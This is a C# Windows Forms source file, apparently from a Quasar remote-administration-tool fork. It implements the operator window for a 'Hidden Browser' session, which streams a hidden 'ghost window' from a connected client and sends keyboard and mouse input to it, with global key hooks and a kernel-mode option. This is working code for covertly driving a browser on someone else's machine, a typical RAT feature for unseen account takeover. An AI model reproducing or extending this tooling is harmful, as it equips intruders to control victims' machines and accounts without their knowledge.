using Gma.System.MouseKeyHook;
using Quasar.Common.Enums;
using Quasar.Common.Helpers;
using Quasar.Common.Messages;
using Quasar.Server.Helper;
using Quasar.Server.Messages;
using Quasar.Server.Networking;
using Quasar.Server.Utilities;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;

namespace Quasar.Server.Forms
{
    public partial class FrmHiddenBrowser : Form
    {
        private bool _enableMouseInput;
        private bool _enableKeyboardInput;
        private IKeyboardMouseEvents _keyboardHook;
        private IKeyboardMouseEvents _mouseHook;
        private readonly List<Keys> _keysPressed;
        private readonly Client _connectClient;
        private readonly HiddenBrowserHandler _hiddenBrowserHandler;
        private static readonly Dictionary<Client, FrmHiddenBrowser> OpenedForms = new Dictionary<Client, FrmHiddenBrowser>();

        public static FrmHiddenBrowser CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
                return OpenedForms[client];
            var f = new FrmHiddenBrowser(client);
            f.Disposed += (s, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        public FrmHiddenBrowser(Client client)
        {
            _connectClient = client;
            _hiddenBrowserHandler = new HiddenBrowserHandler(client);
            _keysPressed = new List<Keys>();

            RegisterMessageHandler();
            InitializeComponent();
            cbMonitors.SelectedIndexChanged += (s, e) =>
            {
                if (_hiddenBrowserHandler != null && cbMonitors.SelectedIndex >= 0)
                    _hiddenBrowserHandler.RequestedDisplayIndex = cbMonitors.SelectedIndex;
            };
            barQuality.ValueChanged += (s, e) =>
            {
                if (_hiddenBrowserHandler != null)
                    _hiddenBrowserHandler.RequestedQuality = barQuality.Value;
            };
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
                this.Invoke((MethodInvoker)this.Close);
        }

        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _hiddenBrowserHandler.ProgressChanged += UpdateImage;
            _hiddenBrowserHandler.KernelInitFailed += OnKernelInitFailed;
            _hiddenBrowserHandler.CloseGhostResult += OnCloseGhostResult;
            MessageHandler.Register(_hiddenBrowserHandler);
        }

        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_hiddenBrowserHandler);
            _hiddenBrowserHandler.ProgressChanged -= UpdateImage;
            _hiddenBrowserHandler.KernelInitFailed -= OnKernelInitFailed;
            _hiddenBrowserHandler.CloseGhostResult -= OnCloseGhostResult;
            _hiddenBrowserHandler.DisplaysChanged -= DisplaysChanged;
            _connectClient.ClientState -= ClientDisconnected;
        }

        private void DisplaysChanged(object sender, int displays)
        {
            void UpdateDisplayList()
            {
                cbMonitors.Items.Clear();
                for (int i = 0; i < displays; i++)
                    cbMonitors.Items.Add($"Display {i + 1}");
                if (cbMonitors.Items.Count > 0)
                    cbMonitors.SelectedIndex = 0;
            }
            if (cbMonitors.InvokeRequired)
                cbMonitors.Invoke((MethodInvoker)UpdateDisplayList);
            else
                UpdateDisplayList();
        }

        private void OnCloseGhostResult(int result, string message)
        {
            string title = "Close Ghost Window";
            if (result == 1)
                MessageBox.Show(message, title, MessageBoxButtons.OK, MessageBoxIcon.Information);
            else if (result == 2)
                MessageBox.Show(message, title, MessageBoxButtons.OK, MessageBoxIcon.Warning);
            else
                MessageBox.Show(message ?? "Failed to close ghost window.", title, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void SubscribeEvents()
        {
            if (PlatformHelper.RunningOnMono)
            {
                this.KeyDown += OnKeyDown;
                this.KeyUp += OnKeyUp;
            }
            else
            {
                _keyboardHook = Hook.GlobalEvents();
                _keyboardHook.KeyDown += OnKeyDown;
                _keyboardHook.KeyUp += OnKeyUp;
                _mouseHook = Hook.AppEvents();
                _mouseHook.MouseWheel += OnMouseWheelMove;
            }
        }

        private void UnsubscribeEvents()
        {
            if (PlatformHelper.RunningOnMono)
            {
                this.KeyDown -= OnKeyDown;
                this.KeyUp -= OnKeyUp;
            }
            else
            {
                if (_keyboardHook != null)
                {
                    _keyboardHook.KeyDown -= OnKeyDown;
                    _keyboardHook.KeyUp -= OnKeyUp;
                    _keyboardHook.Dispose();
                }
                if (_mouseHook != null)
                {
                    _mouseHook.MouseWheel -= OnMouseWheelMove;
                    _mouseHook.Dispose();
                }
            }
        }

        private void StartStream()
        {
            if (cbMonitors.Items.Count == 0)
            {
                MessageBox.Show("No remote display detected.\nPlease wait till the client sends a list with available displays.", "Hidden Browser", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            int selectedDisplay = cbMonitors.SelectedIndex >= 0 ? cbMonitors.SelectedIndex : 0;
            ToggleConfigurationControls(true);
            picDesktop.Start();
            picDesktop.SetFrameUpdatedEvent(frameCounter_FrameUpdated);
            this.ActiveControl = picDesktop;
            _hiddenBrowserHandler.BeginStream(barQuality.Value, selectedDisplay);
        }

        private void StopStream()
        {
            ToggleConfigurationControls(false);
            picDesktop.Stop();
            picDesktop.UnsetFrameUpdatedEvent(frameCounter_FrameUpdated);
            this.ActiveControl = picDesktop;
            _hiddenBrowserHandler.EndStream();
        }

        private void ToggleConfigurationControls(bool started)
        {
            btnStart.Enabled = !started;
            btnStop.Enabled = started;
            cbMonitors.Enabled = !started;
            /* Close is always enabled so user can close ghost window anytime. */
            barQuality.Enabled = true;
        }

        private void TogglePanelVisibility(bool visible)
        {
            panelTop.Visible = visible;
            btnShow.Visible = !visible;
            this.ActiveControl = picDesktop;
        }

        private void UpdateImage(object sender, Bitmap bmp)
        {
            if (bmp == null) return;
            if (picDesktop != null && !picDesktop.IsDisposed)
                picDesktop.UpdateImage(bmp, false);
        }

        private void FrmHiddenBrowser_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Hidden Browser", _connectClient);
            _hiddenBrowserHandler.DisplaysChanged += DisplaysChanged;
            _hiddenBrowserHandler.RefreshDisplays();
            OnResize(EventArgs.Empty);
        }

        private void frameCounter_FrameUpdated(FrameUpdatedEventArgs e)
        {
            this.Text = string.Format("{0} - FPS: {1}", WindowHelper.GetWindowTitle("Hidden Browser", _connectClient), e.CurrentFramesPerSecond.ToString("0.00"));
        }

        private void FrmHiddenBrowser_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnsubscribeEvents();
            if (_hiddenBrowserHandler.IsStarted) StopStream();
            UnregisterMessageHandler();
            _hiddenBrowserHandler.Dispose();
            picDesktop.Image?.Dispose();
        }

        private void FrmHiddenBrowser_Resize(object sender, EventArgs e)
        {
            if (WindowState == FormWindowState.Minimized) return;
            _hiddenBrowserHandler.LocalResolution = picDesktop.Size;
            panelTop.Left = (this.Width - panelTop.Width) / 2;
            btnShow.Left = (this.Width - btnShow.Width) / 2;
            btnHide.Left = (panelTop.Width - btnHide.Width) / 2;
        }

        private void OnKernelInitFailed(string errorMessage)
        {
            UnsubscribeEvents();
            StopStream();
            MessageBox.Show(errorMessage, "Kernel mode failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            SubscribeEvents();
            StartStream();
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            UnsubscribeEvents();
            StopStream();
        }

        private void btnClose_Click(object sender, EventArgs e)
        {
            if (_hiddenBrowserHandler.IsStarted)
            {
                var r = MessageBox.Show(
                    "Closing the ghost window will terminate the Hidden Browser session.\n\nContinue?",
                    "Close Ghost Window",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Warning);
                if (r != DialogResult.Yes)
                    return;
            }
            _hiddenBrowserHandler.CloseGhost();
            /* Result shown in OnCloseGhostResult when client sends CloseHiddenBrowserResult. */
        }

        #region Hidden Browser Input

        private void picDesktop_MouseDown(object sender, MouseEventArgs e)
        {
            if (!_hiddenBrowserHandler.IsStarted) return;
            if (picDesktop.Image != null && _enableMouseInput && this.ContainsFocus)
            {
                MouseAction action = MouseAction.None;
                if (e.Button == MouseButtons.Left) action = MouseAction.LeftDown;
                if (e.Button == MouseButtons.Right) action = MouseAction.RightDown;
                _hiddenBrowserHandler.SendMouseEvent(action, true, e.X, e.Y);
            }
        }

        private void picDesktop_MouseUp(object sender, MouseEventArgs e)
        {
            if (!_hiddenBrowserHandler.IsStarted) return;
            if (picDesktop.Image != null && _enableMouseInput && this.ContainsFocus)
            {
                MouseAction action = MouseAction.None;
                if (e.Button == MouseButtons.Left) action = MouseAction.LeftUp;
                if (e.Button == MouseButtons.Right) action = MouseAction.RightUp;
                _hiddenBrowserHandler.SendMouseEvent(action, false, e.X, e.Y);
            }
        }

        private void picDesktop_MouseMove(object sender, MouseEventArgs e)
        {
            if (!_hiddenBrowserHandler.IsStarted) return;
            if (picDesktop.Image != null && _enableMouseInput && this.ContainsFocus)
                _hiddenBrowserHandler.SendMouseEvent(MouseAction.MoveCursor, false, e.X, e.Y);
        }

        private void OnMouseWheelMove(object sender, MouseEventArgs e)
        {
            if (!_hiddenBrowserHandler.IsStarted) return;
            if (picDesktop.Image != null && _enableMouseInput && this.ContainsFocus)
                _hiddenBrowserHandler.SendMouseEvent(e.Delta == 120 ? MouseAction.ScrollUp : MouseAction.ScrollDown, false, 0, 0);
        }

        private void OnKeyDown(object sender, KeyEventArgs e)
        {
            if (!_hiddenBrowserHandler.IsStarted) return;
            if (picDesktop.Image != null && _enableKeyboardInput && this.ContainsFocus)
            {
                if (!IsLockKey(e.KeyCode)) e.Handled = true;
                if (_keysPressed.Contains(e.KeyCode)) return;
                _keysPressed.Add(e.KeyCode);
                _hiddenBrowserHandler.SendKeyboardEvent((byte)e.KeyCode, true);
            }
        }

        private void OnKeyUp(object sender, KeyEventArgs e)
        {
            if (!_hiddenBrowserHandler.IsStarted) return;
            if (picDesktop.Image != null && _enableKeyboardInput && this.ContainsFocus)
            {
                if (!IsLockKey(e.KeyCode)) e.Handled = true;
                _keysPressed.Remove(e.KeyCode);
                _hiddenBrowserHandler.SendKeyboardEvent((byte)e.KeyCode, false);
            }
        }

        private bool IsLockKey(Keys key)
        {
            return ((key & Keys.CapsLock) == Keys.CapsLock)
                   || ((key & Keys.NumLock) == Keys.NumLock)
                   || ((key & Keys.Scroll) == Keys.Scroll);
        }

        #endregion

        #region Configuration

        private void barQuality_Scroll(object sender, EventArgs e)
        {
            int value = barQuality.Value;
            lblQualityShow.Text = value.ToString();
            if (value < 25) lblQualityShow.Text += " (low)";
            else if (value >= 85) lblQualityShow.Text += " (best)";
            else if (value >= 75) lblQualityShow.Text += " (high)";
            else if (value >= 25) lblQualityShow.Text += " (mid)";
            this.ActiveControl = picDesktop;
        }

        private void btnMouse_Click(object sender, EventArgs e)
        {
            if (_enableMouseInput)
            {
                picDesktop.Cursor = Cursors.Default;
                btnMouse.Image = Properties.Resources.mouse_delete;
                toolTipButtons.SetToolTip(btnMouse, "Enable mouse input.");
                _enableMouseInput = false;
            }
            else
            {
                picDesktop.Cursor = Cursors.Hand;
                btnMouse.Image = Properties.Resources.mouse_add;
                toolTipButtons.SetToolTip(btnMouse, "Disable mouse input.");
                _enableMouseInput = true;
            }
            this.ActiveControl = picDesktop;
        }

        private void btnKeyboard_Click(object sender, EventArgs e)
        {
            if (_enableKeyboardInput)
            {
                picDesktop.Cursor = Cursors.Default;
                btnKeyboard.Image = Properties.Resources.keyboard_delete;
                toolTipButtons.SetToolTip(btnKeyboard, "Enable keyboard input.");
                _enableKeyboardInput = false;
            }
            else
            {
                picDesktop.Cursor = Cursors.Hand;
                btnKeyboard.Image = Properties.Resources.keyboard_add;
                toolTipButtons.SetToolTip(btnKeyboard, "Disable keyboard input.");
                _enableKeyboardInput = true;
            }
            this.ActiveControl = picDesktop;
        }

        #endregion

        private void btnHide_Click(object sender, EventArgs e) => TogglePanelVisibility(false);
        private void btnShow_Click(object sender, EventArgs e) => TogglePanelVisibility(true);
    }
}
